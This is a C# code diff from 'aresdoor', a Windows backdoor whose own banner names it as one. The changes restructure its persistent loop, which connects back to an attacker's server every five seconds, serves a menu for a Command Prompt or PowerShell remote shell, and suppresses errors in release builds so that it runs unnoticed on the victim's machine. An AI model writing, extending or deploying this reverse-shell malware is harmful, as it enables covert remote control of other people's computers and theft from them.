@@ -60,15 +60,16 @@ namespace aresdoor
 
             /* Persistant backdoor connection */
             persistantBackdoor:
-
-            #if DEBUG
+            
             while (true)
             {
                 if (Networking.checkInternetConn(server)) // Determine if the victim is able to connect to the attacker via DHCP (ping) request 
                 {
                     try
                     {
+                    #if DEBUG
                         Console.WriteLine("Sending backdoor to: {0}, port: {1}", server, port);
+                    #endif
 
                         // Define a couple of variables that set our connection target
                         System.Net.Sockets.TcpClient tcpClient = new System.Net.Sockets.TcpClient(server, port);
@@ -84,7 +85,7 @@ namespace aresdoor
 
                             string aresdoorStartMenu = string.Empty;
                             string responseFromServer = string.Empty;
-                            
+
                             aresdoorStartMenu += "+-------------------------------------------------------------+\n";
                             aresdoorStartMenu += "| Welcome to Aresdoor - a backdoor written by @BlackVikingPro |\n";
                             aresdoorStartMenu += "| Current Version: v1.3                                       |\n";
@@ -95,12 +96,12 @@ namespace aresdoor
                             aresdoorStartMenu += " 1) Command Prompt Backdoor\n";
                             aresdoorStartMenu += " 2) Powershell Backdoor\n";
                             aresdoorStartMenu += " 3) Exit\n\n";
-                            
+
                             nc.DataTravelTO(tcpClient, "\n" + aresdoorStartMenu);
 
                             optionInputDisplay: // Define a mark for requesting an option to be inputted
                             nc.DataTravelTO(tcpClient, "aresdoor> ");
-                            
+
                             // Wait for a response
                             responseFromServer = nc.DataTravelFROM(tcpClient);
                             responseFromServer = responseFromServer.Replace("\n", string.Empty).Replace(" ", string.Empty);
@@ -108,7 +109,7 @@ namespace aresdoor
                             if (responseFromServer == "1")
                             {
                                 while (bc.CommandPromptBackdoor(tcpClient)) { }
-                                goto candcmenu;                                
+                                goto candcmenu;
                             }
                             else if (responseFromServer == "2")
                             {
@@ -135,27 +136,20 @@ namespace aresdoor
 
                         // sendBackdoor(server, port);
                     }
+                #if DEBUG
                     catch (Exception exc)
                     { Console.WriteLine(exc.Message); goto persistantBackdoor; } // pass silently unless debug mode is enabled
+                #else
+                    catch (Exception) { goto persistantBackdoor; }
+                #endif
                 }
-                else
-                { Console.WriteLine("Couldn't connect to {0}:{1}. Retrying in 5 seconds...", Networking.resolveHostName(server), port); }
-                System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
-            }
+            #if DEBUG
+                else { Console.WriteLine("Couldn't connect to {0}:{1}. Retrying in 5 seconds...", Networking.resolveHostName(server), port); }
             #else
-            while (true)
-            {
-                if (Networking.checkInternetConn(server)) // Determine if the victim is able to connect to the attacker via DHCP (ping) request 
-                {
-                    try
-                    {
-                        sendBackdoor(server, port);
-                    }
-                    catch (Exception) { } // pass silently unless debug mode is enabled
-                }
+                else { }
+            #endif
                 System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
             }
-            #endif
         }
 
         [System.Runtime.InteropServices.DllImport("kernel32.dll")]
